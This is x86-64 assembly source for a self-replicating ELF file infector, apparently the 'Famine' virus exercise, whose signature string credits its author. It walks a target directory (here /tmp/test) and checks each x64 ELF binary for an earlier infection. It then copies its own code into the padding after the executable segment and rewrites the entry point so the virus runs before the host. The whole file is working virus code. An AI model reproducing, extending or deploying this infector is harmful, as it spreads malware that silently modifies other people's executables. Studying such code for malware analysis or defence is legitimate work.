
%include "famine.inc"

bits 64
section .text
default rel
global _start
host_entry	dq	0x0
pay_off		dq	0x0

_start:
	push rdi
	push rsi
	push rcx
	push rdx

	; === Placing our 'famine' struct on the stack ===
	push rbp
	mov rbp, rsp
	sub rsp, famine_size
	mov rdi, VIRUS_SIZE
	mov FAM(famine.payload_size), rdi

	lea rdi, FAM(famine.old_pwd)
	mov rsi, PATH_MAX
	mov rax, 0x4f
	syscall

	lea rdi, [rel target_dir]
	call _traverse_dirs

	lea rdi, FAM(famine.old_pwd)
	mov rax, 0x50
	syscall

	add rsp, famine_size
	mov rax, [rel _start - 16]
	cmp rax, 0
	je _exit

	mov rdi, [rel _start - 8]
	cmp rdi, 0
	je .jmp

	add rdi, 0x10
	lea r15, [rel _start]
	sub r15, rdi
	add rax, r15

	.jmp:
	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp rax


; ##### LOOP THROUGH TARGET DIRECTORIES #####

_traverse_dirs:
	; === chdir(dirpath) && open(".", O_RDONLY, 0)  TODO : faire un chdir de retour après avoir stocké le current dirname grâce à getcwd syscall ===

	mov rax, 0x50
	syscall
	cmp rax, 0
	jl _return
	mov rax, SYS_OPEN
	lea rdi, [curr_dir]
	mov rsi, O_RDONLY
	xor rdx, rdx
	syscall
	cmp rax, 0
	jl _return

	; === getdents(dir_fd, struc linux_dirent *dirp, count) ===
	mov rdi, rax												; rax has the fd of the "open" call on directory
	sub rsp, DIRENTS_BUFF_SIZE									; Making space on the stack for our dirent array
	mov rsi, rsp												; pointing 2nd argument of getents to the space on the stack
	sub rsp, dirent_wrapper_size								; Making space for the wrapper that will contain total_dreclen
	mov qword [rsp + dirent_wrapper.total_dreclen], 0			; Initializing dreclen to 0
	mov rdx, DIRENTS_BUFF_SIZE
	mov rax, SYS_GETENTS
	syscall
	cmp rax, 0
	jl _exit_dir_loop

	; === Beginning of the loop iterating through files of directory ===
	_list_dir:
		xor r14, r14											; r14 will store d_reclen
		lea rdi, [rsp + dirent_wrapper_size]					; rdi used to navigate current dirent, and ultimatly store d_name
		add rdi, [rsp + dirent_wrapper.total_dreclen]			; bring rdi to our current dirent (start of dirent array + total d_reclen browsed until now)
		mov r13, rdi											; r13 will store d_type of current dirent
		add rdi, D_RECLEN_OFF									; bring rdi to the offset at which d_reclen is located
		mov r14w, word [rdi]									; mov d_reclen (pointed by rdi) to r14
		cmp r14, 0												; if d_reclen is 0, we reached the end of the directories and we exit
		je _exit_dir_loop
		add rdi, D_NAME_OFF - D_RECLEN_OFF						; bring rdi to the offset of d_name
		add [rsp + dirent_wrapper.total_dreclen], r14			; keep track of the total d_reclen
		sub r14, 1
		add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
		movzx r13, byte [r13]									; r13 has d_type value

		cmp r13, 0x8											; r13 has d_type. If type is 0x8 (regular file), handle the file
		je _handle_file
		cmp r13, 0x4											; If type is 0x4 (directory), handle the directory
		je _handle_dir
		jmp _list_dir											; In all other cases, do nothing with the file





; ##### FILE INFECTION #####

_file:
	; === open(filename, O_RDWR, 0) | (path must be in rdi) ===
	mov rax, SYS_OPEN
	mov rsi, O_RDWR
	xor rdx, rdx
	syscall
	mov FAM(famine.fd), rax										; Saving the file fd in famine.fd
	cmp rax, 0													; Error checking (open failed)
	jl _not_valid_x64

	; === Calculate the size of the file with lseek ===
	mov rdi, rax
	xor rsi, rsi
	mov rdx, 2
	mov rax, SYS_LSEEK
	syscall
	mov FAM(famine.fsize), rax									; Saving the file size in famine.fsize
	cmp rax, 4													; Error checking (file too small)
	jl _not_valid_x64

	; === mmap(0, famine.fsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
	mov rdi, 0
	mov rsi, FAM(famine.fsize)
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	mov r8, FAM(famine.fd)
	mov r9, 0
	mov rax, 9
	syscall
	mov FAM(famine.map_ptr), rax								; Saving mapped file pointer in famine.map_ptr
	cmp rax, 0													; Error checking (mmap failed)
	jl _not_valid_x64

	; === Closing the fd ===
	mov rax, SYS_CLOSE
	mov rdi, FAM(famine.fd)
	syscall

	; === Making sure the file is an ELF file ===
	mov rax, FAM(famine.map_ptr)
	mov dword eax, [rax]
	cmp eax, 0x464c457f											; Magic bytes characterising an ELF file
	jne _not_valid_x64

	; === Making sure the ELF file is x64 ===
	mov rax, FAM(famine.map_ptr)
	add rax, 0x4
	movzx rax, byte [rax]
	cmp rax, 0x2
	jne _not_valid_x64

	; === Getting the segments offset in file ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_phoff

	; === Finding the text segment in file ===
	mov r11, [rax]												; Storing e_phoff in r11
	mov r14, FAM(famine.map_ptr)
	add r14, elf64_ehdr.e_phnum
	movzx r14, word [r14]										; Storing e_phnum in r14

	dec r14														; Decrementing by 1 since our counter starts at 0
	mov rax, FAM(famine.map_ptr)
	add rax, r11												; rax is now at the start of segment headers in file
	xor r13, r13												; Used to loop through all segment headers
	_phnum_loop:
		call _is_text_segment
		cmp r14, r13
		je _list_dir											; We iterated through all segment headers and didnt find the text segment. Give up for this file
		add rax, elf64_phdr_size
		inc r13
		jmp _phnum_loop
	_found_text_segment:
		add rax, elf64_phdr.p_offset
		mov rdi, [rax]
		mov FAM(famine.txt_offset), rdi

		add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
		mov rdi, [rax]
		mov FAM(famine.txt_vaddr), rdi

		add rax, elf64_phdr.p_filesz - elf64_phdr.p_vaddr
		mov rdi, [rax]
		mov FAM(famine.txt_filesz), rdi

		add rax, elf64_phdr_size - (elf64_phdr.p_filesz - elf64_phdr.p_offset)
		mov rdi, [rax]
		mov FAM(famine.next_offset), rdi

	; === Is the file already infected ? ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)
	add rdi, 16
	add rdi, VIRUS_SIZE
	sub rdi, (_finish - signature)
	mov rax, [rel signature]
	cmp rax, qword [rdi]
	je _not_valid_x64

	; === Calculating the space available in padding gap ===
	mov rsi, FAM(famine.next_offset)
	mov rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)
	sub rsi, rdi
	mov FAM(famine.gap_size), rsi

	; === Comparing gap size and virus size ===
	mov rdi, FAM(famine.payload_size)
	cmp rdi, rsi
	jg _not_enough_space

	; === Patch ELF entry point ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_entry
	mov rsi, [rax]
	mov FAM(famine.orig_entry), rsi
	mov rdi, FAM(famine.txt_vaddr)
	add rdi, FAM(famine.txt_filesz)
	add rdi, 16
	mov [rax], rdi
	
	; === Writing virus from injection point ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
	lea rsi, FAM(famine.orig_entry)
	mov rcx, 0x1
	repnz movsq													; Copy host entry point
	
	mov rax, FAM(famine.map_ptr)
	add rax, 0x10
	movzx rax, word [rax]
	cmp rax, 0x3
	jne .entry

	mov rdi, FAM(famine.map_ptr)								; Only write this if PIC
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
	add rdi, 8
	xor rsi, rsi
	add rsi, FAM(famine.txt_offset)
	add rsi, FAM(famine.txt_filesz)
	mov FAM(famine.payload_off), rsi
	lea rsi, FAM(famine.payload_off)
	mov rcx, 0x1
	repnz movsq													; Copy payload offset

	.entry:
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
	add rdi, 16
	lea rsi, [rel _start]												; RSI at start of virus
	mov rcx, VIRUS_SIZE											; Copy whole virus to injection point
	repnz movsb
	jmp _list_dir


_is_text_segment:
	mov rsi, rax												; rax has the address of p_type
	cmp dword [rsi], 0x1										; |
	jne _return													; |	--> If the segment type isn't PT_LOAD, this isn't the text segment  
	add rsi, elf64_phdr.p_flags
	mov rsi, [rsi]
	and rsi, 0x1												; |
	cmp rsi, 0x0												; | --> If the segment hasn't the flag PF_X (executable), this isn't the text segment
	je _return													; |
	pop rdi
	jmp _found_text_segment



_not_valid_x64:
	; === Stop handling file after error ; silently continue _list_dir loop ===
	jmp _list_dir

_not_enough_space:
	jmp _list_dir

_return:
	ret

_handle_dir:
	jmp _list_dir

_handle_file:
	jmp _file

_exit_dir_loop:
	add rsp, DIRENTS_BUFF_SIZE
	add rsp, dirent_wrapper_size
	ret

_exit:
	mov rax, SYS_EXIT
	mov rdi, 0
	syscall

target_dir	db		"/tmp/test",0x0
curr_dir	db		".",0x0
signature	db		"Famine version 1.0 (c)oded by qroland",0x0
_finish:

